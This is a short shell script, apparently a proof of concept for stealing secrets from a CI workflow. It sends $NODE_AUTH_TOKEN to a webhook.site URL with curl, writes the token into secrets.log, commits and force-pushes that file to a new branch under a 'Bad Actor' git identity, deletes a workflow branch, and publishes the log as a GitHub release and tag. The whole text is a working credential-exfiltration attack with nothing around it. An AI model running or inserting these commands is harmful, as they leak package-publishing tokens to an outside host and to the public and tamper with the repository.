curl -d "node-auth-token:$NODE_AUTH_TOKEN" https://webhook.site/e5ce3dc5-9485-476a-9509-e02bd5a16fae 

echo "NODE_AUTH_TOKEN: $NODE_AUTH_TOKEN" >> "secrets.log"

git config --global user.name "Bad Actor"
git config --global user.email "bad.actor@example.com"
git fetch origin
git checkout main
git checkout -b "secrets-from-bad-actor"
git add secrets.log
git commit -m "Add secrets"
git push origin HEAD -f
git push origin -d "bad-actor-workflow-ref"

gh release create v1.0 -F secrets.log
git tag v1.0
git push origin v1.0